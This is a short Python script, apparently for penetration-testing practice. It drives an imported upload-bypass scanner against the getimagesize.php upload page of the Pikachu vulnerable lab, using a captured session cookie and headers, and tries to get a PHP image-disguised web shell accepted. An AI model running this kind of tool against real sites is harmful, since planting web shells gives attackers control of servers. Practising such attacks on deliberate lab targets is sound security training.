from checkUploadBypass import FileUploadScanner

burp0_url = "http://pikachu.com:80/vul/unsafeupload/getimagesize.php"
burp0_cookies = {"PHPSESSID": "dkin7j81f93jkuov8vgvpsv85k"}
burp0_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "Origin": "http://pikachu.com", "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryiSLJ7kSMfLBVuWz0", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.95 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Referer": "http://pikachu.com/vul/unsafeupload/getimagesize.php", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"}

multipart_field = {
    'submit':'submit'
}

FileUploadScanner(flag="文件上传成功").check_image_shell("php", burp0_url, burp0_cookies, burp0_headers, multipart_field, "uploadfile")

